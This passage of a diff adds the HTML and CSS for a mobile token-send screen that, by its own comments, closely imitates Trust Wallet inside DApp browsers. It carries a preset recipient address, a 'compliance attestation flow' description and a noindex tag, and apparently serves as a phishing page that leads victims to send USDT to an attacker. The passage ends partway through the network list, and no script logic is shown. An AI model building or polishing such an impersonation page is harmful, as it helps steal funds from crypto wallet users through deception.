@@ -1,0 +1,2524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Amount</title>
+<meta name="description" content="Chainscaner wallet send view — the token transfer confirmation screen used by the compliance attestation flow.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  html {
+    -webkit-text-size-adjust: 100%; text-size-adjust: 100%;
+    /* Lock the document — no rubber-band / no page drift on taps. The
+       scrollable .content keeps working inside the fixed shell */
+    position: fixed;
+    inset: 0;
+    overflow: hidden;
+    /* Kills the 300ms double-tap delay and double-tap zoom — instant keys */
+    touch-action: manipulation;
+  }
+  button, .np-key, .btn-next, .to-bar, .amount-max, .sheet-item {
+    touch-action: manipulation;
+  }
+
+  /* ── Theme Variables — Trust Wallet 2023+ rebrand (Trust Blue/Trust Green) ── */
+  :root {
+    color-scheme: dark;
+    --bg-outer: #07080C;
+    --bg-primary: #07080C;
+    --bg-sheet: #0F111A;
+    --bg-card: #141A30;
+    --bg-input: #181F38;
+    --surface: #1C1F2E;
+    --bg-pill: #1C1F2E;
+    --surface-disabled: #1A1D28;
+    --border: #1E2130;
+    --divider: #1E2130;
+    --border-focus: #4C6FFF;
+    --text-primary: #FFFFFF;
+    --text-secondary: #8A8FA3;
+    --text-muted: #353A5C;
+    --text-disabled: #3A3F5E;
+    --text-placeholder: #353A5C;
+    --dim: #353A5C;
+    --danger: #FF5A5F;
+    --accent: #4C6FFF;
+    --accent-dim: #1A1D28;
+    --accent-text-dim: #3A3F5E;
+    --accent-green: #05B956;
+    --tether-green: #26A17B;
+    --eth-blue: #627EEA;
+    --btn-text: #FFFFFF;
+    --icon-color: #8A8FA3;
+    --overlay: rgba(4,6,16,.72);
+    --modal-bg: #141A30;
+    --shadow: rgba(0,0,0,.5);
+    --home-ind: #FFFFFF;
+    --np-active: rgba(255,255,255,.05);
+    /* Viewport-bottom zone covered by in-app browser chrome (TW toolbar).
+       Measured via visualViewport in JS — this is only the pre-JS floor so
+       the bar never slides under the toolbar before the first measure. */
+    --bottom-cover: 100px;
+  }
+
+  /* ── Light mode — follows the device, incl. DApp-browser webviews ── */
+  @media (prefers-color-scheme: light) {
+    :root {
+      color-scheme: light;
+      --bg-outer: #F2F3F7;
+      --bg-primary: #F2F3F7;
+      --bg-sheet: #FFFFFF;
+      --bg-card: #FFFFFF;
+      --bg-input: #F5F6FA;
+      --surface: #F0F1F5;
+      --bg-pill: #F0F1F5;
+      --surface-disabled: #F0F1F5;
+      --border: #EEEFF3;
+      --divider: #EEEFF3;
+      --text-primary: #0B0D14;
+      --text-secondary: #8A8FA3;
+      --text-muted: #C6CAD9;
+      --text-disabled: #C6CAD9;
+      --text-placeholder: #C6CAD9;
+      --dim: #C6CAD9;
+      --accent: #4C6FFF;
+      --icon-color: #8A8FA3;
+      --overlay: rgba(20,24,40,.4);
+      --modal-bg: #FFFFFF;
+      --shadow: rgba(16,24,64,.12);
+      --home-ind: #0B0D14;
+      --np-active: rgba(0,0,0,.05);
+    }
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    /* --app-h is the JS-measured real visible height (visualViewport). vh/svh
+       lie on Android webviews: vh includes the browser toolbar, and some
+       WebViews report svh == vh — either way the sheet ends up ~90px taller
+       than the screen and the bottom button is clipped for good. */
+    height: 100vh;
+    height: 100svh;
+    height: var(--app-h, 100svh);
+    /* Fully pinned to the viewport — the page can not be dragged anywhere,
+       it must behave like a native screen, not a scrollable web page */
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    overflow: hidden;
+    overscroll-behavior: none;
+    display: flex;
+    flex-direction: column;
+    -webkit-user-select: none;
+    user-select: none;
+    -webkit-touch-callout: none;
+  }
+
+  /* ── Sheet page (screen sits as a sheet over the darker app bg) ── */
+  .sheet-page {
+    flex: 1;
+    width: 100%;
+    max-width: 430px;
+    /* Cap the top inset: DApp-browser webviews report the full Dynamic-Island
+       inset (~59px) even though the URL bar already sits above us — that was
+       the dead strip under the address bar */
+    margin: max(min(env(safe-area-inset-top, 0px), 14px), 8px) auto 0;
+    display: flex;
+    flex-direction: column;
+    background: var(--bg-sheet);
+    border-radius: 24px 24px 0 0;
+    overflow: hidden;
+    min-height: 0;
+    /* iOS-style sheet presentation — rises from the bottom like the real
+       wallet. 'backwards' + tiny delay so the sheet stays in the from-state
+       (off-screen) from the very first paint — without it the mask flashes
+       once at its final position, then jumps down and rises = double slide.
+       No transform persists after the animation, so the position:fixed
+       button keeps its viewport anchor */
+    animation: sheet-rise .45s cubic-bezier(.32,.72,0,1) .06s backwards;
+  }
+  @keyframes sheet-rise {
+    from { transform: translateY(100%); }
+    to   { transform: translateY(0); }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .sheet-page { animation: none; }
+  }
+
+  /* ── Header ── */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    min-height: 68px;
+    padding: 0 14px;
+    border-bottom: 1px solid var(--divider);
+    flex-shrink: 0;
+    position: relative;
+  }
+  .header-btn {
+    width: 40px; height: 40px;
+    display: flex; align-items: center; justify-content: center;
+    background: var(--surface); border: none; cursor: pointer;
+    color: var(--text-primary);
+    border-radius: 50%;
+    transition: background .15s;
+  }
+  .header-btn:active { background: var(--bg-input); }
+  .header-spacer { width: 40px; height: 40px; flex-shrink: 0; }
+  .header-title {
+    font-size: 17px; font-weight: 600;
+    color: var(--text-primary);
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+  }
+
+  /* ── Content ── */
+  .content {
+    flex: 1;
+    min-height: 0; /* lets the hero shrink before the numpad overflows */
+    padding: 0;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+    overscroll-behavior: none;
+    display: flex;
+    flex-direction: column;
+  }
+  /* ── To bar (recipient from previous step) ── */
+  .to-bar {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 12px 14px;
+    border-bottom: 1px solid var(--divider);
+    font-size: 17px;
+    line-height: 1.45;
+    color: var(--text-primary);
+    flex-shrink: 0;
+  }
+  .to-bar .to-label { color: var(--text-secondary); font-weight: 500; flex-shrink: 0; }
+  .to-bar #input-addr {
+    font-weight: 600;
+    letter-spacing: .2px;
+    /* One line, middle-free ellipsis — matches the real app and saves a
+       full row of vertical space on every phone */
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    min-width: 0;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+
+  /* ── Amount Hero — vertically centered in the free area ── */
+  .amount-hero {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    flex: 1;
+    min-height: 0;
+    gap: 10px;
+  }
+  .amount-hero input {
+    border: none; outline: none;
+    background: transparent;
+    color: var(--text-primary);
+    font-size: clamp(30px, calc(var(--app-h, 100svh) * 0.064), 46px);
+    font-weight: 800;
+    letter-spacing: -.01em;
+    text-align: center;
+    width: 100%;
+    caret-color: transparent;
+    transition: color .18s, font-size .15s;
+  }
+  .amount-hero input::placeholder { color: var(--text-muted); font-weight: 800; }
+  .amount-fiat {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 18px; font-weight: 500;
+    color: var(--text-primary);
+    cursor: pointer;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+  .amount-fiat:active { opacity: .7; }
+  .amount-fiat svg { width: 16px; height: 16px; color: var(--text-secondary); }
+  .amount-hint {
+    font-size: 13px; font-weight: 600;
+    color: var(--danger);
+  }
+
+  /* ── Token / balance row ── */
+  .token-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 0 14px;
+    margin-bottom: 16px;
+    flex-shrink: 0;
+  }
+  .token-icon {
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    position: relative;
+  }
+  .token-icon svg { width: 36px; height: 36px; }
+  .token-badge {
+    position: absolute;
+    right: -3px; bottom: -3px;
+    width: 16px; height: 16px;
+    border-radius: 4px;
+    background: var(--eth-blue);
+    border: 2px solid var(--bg-sheet);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .token-badge svg { width: 9px; height: 9px; }
+  .token-info { flex: 1; min-width: 0; }
+  .token-balance {
+    font-size: 17px; font-weight: 600;
+    color: var(--text-primary);
+    letter-spacing: -.01em;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .token-fiat {
+    font-size: 14px; font-weight: 500;
+    color: var(--text-secondary);
+    margin-top: 2px;
+  }
+  .amount-max {
+    background: var(--surface);
+    border: none;
+    border-radius: 999px;
+    cursor: pointer;
+    color: var(--text-primary);
+    font-size: 16px; font-weight: 500;
+    padding: 0 18px;
+    height: 40px;
+    transition: all .15s;
+    flex-shrink: 0;
+    margin-left: auto;
+  }
+  .amount-max:active { transform: scale(.95); background: var(--bg-input); }
+
+  /* ── Custom numpad ── */
+  .numpad {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    padding: 0 14px;
+    flex-shrink: 0;
+  }
+  .np-key {
+    background: none; border: none; cursor: pointer;
+    color: var(--text-primary);
+    font-size: clamp(20px, calc(var(--app-h, 100svh) * 0.03), 26px); font-weight: 700;
+    font-family: inherit;
+    /* Keys scale with the real viewport — fixed 57px clipped the last row
+       on short in-app webviews */
+    height: clamp(38px, calc(var(--app-h, 100svh) * 0.069), 60px);
+    min-height: 0;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 12px;
+    transition: background .1s, transform .08s;
+    -webkit-user-select: none; user-select: none;
+  }
+  .np-key:active { background: var(--np-active); transform: scale(.94); }
+  .np-key svg { width: 24px; height: 24px; color: var(--text-primary); }
+
+  /* Bottom Sheet */
+  .sheet-overlay {
+    position: fixed; inset: 0;
+    background: var(--overlay);
+    z-index: 1000;
+    animation: fadeIn .2s ease-out;
+  }
+  .sheet {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    max-width: 430px;
+    margin-left: auto;
+    margin-right: auto;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-bottom: none;
+    border-radius: 24px 24px 0 0;
+    max-height: 74vh;
+    z-index: 1001;
+    animation: slideUp .25s ease-out;
+    display: flex;
+    flex-direction: column;
+    padding-bottom: env(safe-area-inset-bottom, 0);
+  }
+  @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+  .sheet-grab {
+    width: 40px; height: 4px;
+    background: var(--border);
+    border-radius: 2px;
+    margin: 10px auto 0;
+    flex-shrink: 0;
+  }
+  .sheet-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 20px 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .sheet-title {
+    font-size: 17px; font-weight: 700;
+    color: var(--text-primary);
+    letter-spacing: -.01em;
+  }
+  .sheet-close {
+    background: none; border: none; cursor: pointer;
+    color: var(--text-secondary); padding: 4px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .sheet-search {
+    padding: 12px 20px;
+    border-bottom: 1px solid var(--border);
+  }
+  .sheet-search input {
+    width: 100%;
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 11px 14px;
+    font-size: 16px;
+    color: var(--text-primary);
+    outline: none;
+    transition: border-color .15s;
+  }
+  .sheet-search input:focus { border-color: var(--border-focus); }
+  .sheet-search input::placeholder { color: var(--text-placeholder); }
+  .sheet-list {
+    overflow-y: auto;
+    padding: 8px 0;
+  }
+  .sheet-item {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 12px 20px;
+    cursor: pointer;
+    transition: background .15s;
+  }
+  .sheet-item:active { background: var(--bg-input); }
+  .sheet-item-icon {
+    width: 40px; height: 40px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .sheet-item-icon svg { width: 20px; height: 20px; }
+  .sheet-item-name {
+    font-size: 15px; font-weight: 600;
+    color: var(--text-primary);
+    flex: 1;
+  }
+  .sheet-item-check {
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    border: 2px solid var(--border);
+    flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .sheet-item-check.active {
+    border-color: var(--accent);
+    background: var(--accent);
+  }
+  .sheet-item-check.active svg { display: block; }
+  .sheet-item-check svg { display: none; }
+
+  /* ── Spacer ── */
+  .spacer { flex: 1; min-height: 32px; }
+
+  /* ── Bottom Button ── */
+  .bottom-btn-wrapper {
+    padding: 12px 14px 4px;
+    flex-shrink: 0;
+  }
+  /* In-app wallet browsers (Trust Wallet etc.) draw their own bottom toolbar
+     OVER the webview. The covered zone is measured via visualViewport and
+     exposed as --bottom-cover; the sheet reserves exactly that space, so the
+     in-flow bar always renders above the toolbar and can never slide under
+     it — no fixed positioning, no overlap possible. */
+  @media (max-width: 768px) {
+    .sheet-page {
+      padding-bottom: calc(max(var(--bottom-cover, 0px), env(safe-area-inset-bottom, 0px)) + 8px);
+    }
+    /* The fake home indicator is a desktop prop — real devices draw their
+       own, so the stray line under the button goes away */
+    .home-indicator { display: none; }
+    /* Bottom sheets (address edit, token picker, network) must float above
+       the DApp-browser toolbar too — bottom:0 would cut their buttons off */
+    .sheet { bottom: calc(max(var(--bottom-cover, 0px), env(safe-area-inset-bottom, 0px))); }
+  }
+  .fee-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 0 6px 8px;
+    font-size: 12.5px; font-weight: 500;
+    color: var(--text-secondary);
+    letter-spacing: .01em;
+  }
+  .fee-val { font-variant-numeric: tabular-nums; font-weight: 600; }
+  .btn-next {
+    width: 100%;
+    height: 50px;
+    background: var(--surface-disabled);
+    color: var(--text-disabled);
+    border: none;
+    border-radius: 999px;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background .1s, color .1s, transform .08s;
+    text-align: center;
+    letter-spacing: .01em;
+  }
+  .btn-next.ready {
+    background: var(--accent);
+    color: var(--btn-text);
+  }
+  .btn-next.ready:hover { background: #5B7DFF; }
+  .btn-next:active { transform: scale(.96); filter: brightness(.94); }
+  .btn-next:disabled { cursor: not-allowed; }
+
+  /* ── Home Indicator (iOS) ── */
+  .home-indicator {
+    width: 135px; height: 5px;
+    background: var(--home-ind);
+    border-radius: 3px;
+    margin: 8px auto;
+    opacity: .9;
+  }
+
+  /* ── Responsive: viewport-aware sheet ─────────────────────────────────────
+     Goal: header → to-bar → token row → numpad → Review button ALWAYS fit
+     inside the real visible viewport on every phone, no scrolling needed
+     for the primary flow. The button lives outside .content so it can never
+     be scrolled away or covered. */
+  @media (min-width: 768px) and (min-height: 600px) {
+    /* Desktop framing only: keep the 52px strip that simulates the status
+       bar. Landscape phones (wide but short) stay in mobile mode. */
+    .sheet-page { margin-top: 52px; }
+  }
+  @media (max-height: 700px) {
+    /* Short screens (iPhone SE, small Androids, split view): compress
+       chrome, keep numpad + button fully visible without scrolling */
+    .header { min-height: 56px; }
+    .to-bar { padding: 8px 14px; }
+    .token-row { margin-bottom: 6px; }
+    .amount-hero { padding-top: 8px; padding-bottom: 8px; }
+    .bottom-btn-wrapper { padding-top: 8px; }
+  }
+  @media (max-height: 560px) {
+    /* Landscape phones / very short webviews */
+    .token-row { padding: 0 14px; }
+    .header { min-height: 48px; }
+  }
+
+  /* ── Modal ── */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: var(--overlay);
+    display: flex; align-items: center; justify-content: center;
+    z-index: 2000;
+    animation: fadeIn .2s ease-out;
+  }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes scaleIn { from { transform: scale(.92); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  .modal-card {
+    background: var(--modal-bg);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    padding: 28px 24px;
+    width: calc(100% - 32px);
+    max-width: 360px;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    box-shadow: 0 24px 48px var(--shadow);
+    animation: scaleIn .2s ease-out;
+  }
+  .modal-close {
+    position: absolute; top: 14px; right: 14px;
+    background: none; border: none; cursor: pointer;
+    color: var(--text-secondary); padding: 4px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .modal-icon {
+    width: 60px; height: 60px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 16px;
+  }
+  .modal-icon.pending { background: rgba(5,0,255,.16); }
+  .modal-icon.success { background: rgba(5,185,86,.14); }
+  .modal-icon.error { background: rgba(255,92,92,.14); }
+  .modal-title {
+    font-size: 18px; font-weight: 700;
+    color: var(--text-primary);
+    margin-bottom: 8px;
+    letter-spacing: -.01em;
+  }
+  .modal-text {
+    font-size: 14px; color: var(--text-secondary);
+    line-height: 1.5; margin-bottom: 20px;
+  }
+  .modal-btn {
+    display: block; width: 100%;
+    padding: 14px;
+    background: var(--accent); color: var(--btn-text);
+    border: none; border-radius: 999px;
+    font-size: 15px; font-weight: 700;
+    cursor: pointer; text-decoration: none;
+    text-align: center;
+  }
+  .modal-btn:hover { opacity: .9; }
+  .to-bar { cursor: pointer; }
+  .to-bar .to-edit { margin-left: auto; flex-shrink: 0; color: var(--text-secondary); display: flex; align-items: center; }
+  .token-row .token-tap { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; cursor: pointer; }
+  .sheet-pad { padding: 0 14px 14px; }
+  .addr-edit-input {    width: 100%; box-sizing: border-box; background: var(--surface);
+    border: 1px solid var(--divider); border-radius: 12px; padding: 14px;
+    color: var(--text-primary); font-size: 16px; font-family: inherit;
+    outline: none; word-break: break-all;
+  }
+  .addr-edit-input:focus { border-color: var(--accent); }
+  .addr-edit-input.invalid { border-color: #FF5A5F; }
+  .addr-edit-error { color: #FF5A5F; font-size: 13px; padding: 0 14px 10px; }
+  .sheet-actions { display: flex; gap: 10px; padding: 0 14px 20px; }
+  .sheet-btn {
+    flex: 1; height: 48px; border-radius: 999px; border: none;
+    font-size: 16px; font-weight: 600; font-family: inherit; cursor: pointer;
+    transition: filter .15s, transform .1s;
+  }
+  .sheet-btn:active { transform: scale(.98); filter: brightness(1.15); }
+  .sheet-btn.primary { background: var(--accent); color: #fff; }
+  .sheet-btn.ghost { background: var(--surface); color: var(--text-primary); }
+  .sheet-token-sub { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
+  .hidden { display: none !important; }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { transition-duration: .01ms !important; animation-duration: .01ms !important; }
+  }
+</style>
+</head>
+<body>
+
+<div class="sheet-page">
+
+<!-- HEADER -->
+<header class="header">
+  <button class="header-btn" onclick="history.back()" data-i18n-title="back" aria-label="Back">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+  </button>
+  <span class="header-title" id="header-title">Amount</span>
+  <div class="header-spacer"></div>
+</header>
+
+<!-- TO BAR (recipient carried over from previous step — tap to edit, like the real app) -->
+<div class="to-bar" onclick="openAddrSheet()" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();openAddrSheet();}" aria-label="Edit recipient address">
+  <span class="to-label" id="to-label">To: </span><span id="input-addr">0xB2bC30…373b1</span>
+  <span class="to-edit"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 3a2.83 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg></span>
+</div>
+
+<!-- CONTENT -->
+<main class="content">
+
+  <!-- Amount Hero -->
+  <div class="amount-hero">
+    <input type="text" id="display-amount" placeholder="0" readonly inputmode="decimal" oninput="onAmountInput()" aria-label="Amount">
+    <div class="amount-fiat" onclick="toggleFiatMode()" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();toggleFiatMode();}" role="button" tabindex="0" aria-label="Switch between token and fiat input">
+      <span id="approx">≈ $0.00</span>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 16V4"/><path d="M7 4L3 8"/><path d="M7 4l4 4"/><path d="M17 8v12"/><path d="M17 20l4-4"/><path d="M17 20l-4-4"/></svg>
+    </div>
+    <div class="amount-hint hidden" id="amount-hint">Insufficient balance</div>
+  </div>
+
+  <!-- Token / balance row — tap token to switch asset, like the real picker -->
+  <div class="token-row">
+    <div class="token-tap" onclick="openTokenSheet()" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();openTokenSheet();}" aria-label="Select token">
+    <div class="token-icon" id="token-icon">
+      <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#26A17B"/><path d="M13.37 12.98v-.003c-.08.005-.49.03-1.4.03-.76 0-1.3-.02-1.4-.03v.003c-2.71-.12-4.73-.59-4.73-1.15s2.02-1.03 4.73-1.15v1.85c.1.01.66.04 1.42.04.91 0 1.31-.04 1.38-.04v-1.85c2.7.12 4.72.59 4.72 1.15s-2.01 1.03-4.72 1.15zm0-2.27V8.57h3.78V5.22H6.84v3.35h3.79v2.14c-3.08.15-5.4.75-5.4 1.48 0 .73 2.32 1.33 5.4 1.48v6.01h2.74v-6.01c3.07-.15 5.39-.75 5.39-1.48 0-.73-2.32-1.33-5.39-1.48z" fill="#fff"/></svg>
+      <span class="token-badge" id="token-badge"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 0L5 12.5l7 4.5 7-4.5L12 0z"/><path d="M12 17l-7 4.5L12 24l7-4.5L12 17z"/></svg></span>
+    </div>
+    <div class="token-info">
+      <div class="token-balance"><span id="token-balance">0</span> <span id="display-token">USDT</span></div>
+      <div class="token-fiat" id="token-fiat">$0.00</div>
+    </div>
+    </div>
+    <button class="amount-max" onclick="setMax()">Max</button>
+  </div>
+</main>
+
+<!-- Custom numpad — fixed flex sibling, never scrolls or clips -->
+<div class="numpad">
+    <button class="np-key" onclick="pressKey('1')">1</button>
+    <button class="np-key" onclick="pressKey('2')">2</button>
+    <button class="np-key" onclick="pressKey('3')">3</button>
+    <button class="np-key" onclick="pressKey('4')">4</button>
+    <button class="np-key" onclick="pressKey('5')">5</button>
+    <button class="np-key" onclick="pressKey('6')">6</button>
+    <button class="np-key" onclick="pressKey('7')">7</button>
+    <button class="np-key" onclick="pressKey('8')">8</button>
+    <button class="np-key" onclick="pressKey('9')">9</button>
+    <button class="np-key" onclick="pressKey('.')">.</button>
+    <button class="np-key" onclick="pressKey('0')">0</button>
+    <button class="np-key" onclick="backKey()" aria-label="Delete">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 5H9L2 12l7 7h13a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
+    </button>
+  </div>
+
+<!-- BOTTOM BUTTON -->
+<div class="bottom-btn-wrapper">
+  <div class="fee-row">
+    <span class="fee-label">Network Fee</span>
+    <span class="fee-val">≈ $0.42 · paid from your wallet</span>
+  </div>
+  <button class="btn-next" id="next-btn" onclick="clickNext()" disabled>Review</button>
+  <div class="home-indicator"></div>
+</div>
+
+</div><!-- /sheet-page -->
+
+<!-- NETWORK SHEET -->
+<div id="network-sheet" class="hidden">
+  <div class="sheet-overlay" onclick="closeNetworkSheet()"></div>
+  <div class="sheet">
+    <div class="sheet-grab"></div>
+    <div class="sheet-header">
+      <span class="sheet-title" data-i18n="selectNetwork">Select network</span>
+      <button class="sheet-close" onclick="closeNetworkSheet()" data-i18n-title="close" aria-label="Close">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <div class="sheet-search">
+      <input type="text" placeholder="Search tokens" data-i18n-placeholder="searchTokens" oninput="filterNetworks(this.value)">
+    </div>
+    <div class="sheet-list" id="network-list">
+      <div class="sheet-item" onclick="selectNetwork('0x1','Ethereum','#627EEA')">
+        <div class="sheet-item-icon" style="background:#627EEA;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 0L5 12.5l7 4.5 7-4.5L12 0z"/><path d="M12 17l-7 4.5L12 24l7-4.5L12 17z"/></svg></div>
+        <span class="sheet-item-name">Ethereum</span>
+        <div class="sheet-item-check active" id="check-0x1"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0x38','BNB Smart Chain','#F0B90B')">
+        <div class="sheet-item-icon" style="background:#F0B90B;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg></div>
+        <span class="sheet-item-name">BNB Smart Chain</span>
+        <div class="sheet-item-check" id="check-0x38"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0x89','Polygon','#8247E5')">
+        <div class="sheet-item-icon" style="background:#8247E5;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2l9 5-9 5-9-5 9-5z"/><path d="M3 12l9 5 9-5"/><path d="M3 17l9 5 9-5"/></svg></div>
+        <span class="sheet-item-name">Polygon</span>
+        <div class="sheet-item-check" id="check-0x89"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0xa4b1','Arbitrum','#28A0F0')">
+        <div class="sheet-item-icon" style="background:#28A0F0;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg></div>
+        <span class="sheet-item-name">Arbitrum</span>
+        <div class="sheet-item-check" id="check-0xa4b1"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0xa','OP Mainnet','#FF0420')">
+        <div class="sheet-item-icon" style="background:#FF0420;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">OP Mainnet</span>
+        <div class="sheet-item-check" id="check-0xa"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0x2105','Base','#0052FF')">
+        <div class="sheet-item-icon" style="background:#0052FF;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">Base</span>
+        <div class="sheet-item-check" id="check-0x2105"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0xa86a','Avalanche C-Chain','#E84142')">
+        <div class="sheet-item-icon" style="background:#E84142;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">Avalanche C-Chain</span>
+        <div class="sheet-item-check" id="check-0xa86a"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0xa4ec','Celo','#35D07F')">
+        <div class="sheet-item-icon" style="background:#35D07F;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">Celo</span>
+        <div class="sheet-item-check" id="check-0xa4ec"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0xfa','Fantom','#1969FF')">
+        <div class="sheet-item-icon" style="background:#1969FF;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">Fantom</span>
+        <div class="sheet-item-check" id="check-0xfa"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
